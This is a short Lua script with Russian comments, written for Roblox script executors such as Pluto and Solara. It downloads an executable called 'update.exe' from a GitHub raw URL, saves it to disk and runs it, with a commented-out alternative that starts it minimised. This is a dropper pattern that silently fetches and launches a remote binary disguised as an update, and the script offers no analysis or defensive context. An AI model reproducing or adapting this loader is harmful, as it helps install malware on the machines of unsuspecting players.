-- 🔥 PLUTO EXECUTOR (подходит идеально!)

local url = "https://github.com/chibik777/sadasdas/raw/refs/heads/main/update.exe"

-- Pluto HttpGet
local data = game:HttpGet(url)
writefile("update.exe", data)

-- Pluto execute (работает как Solara)
task.spawn(function()
    task.wait(0.1)
    executefile("update.exe") -- Pluto syntax
    -- или
    -- execute('start /min update.exe')
end)
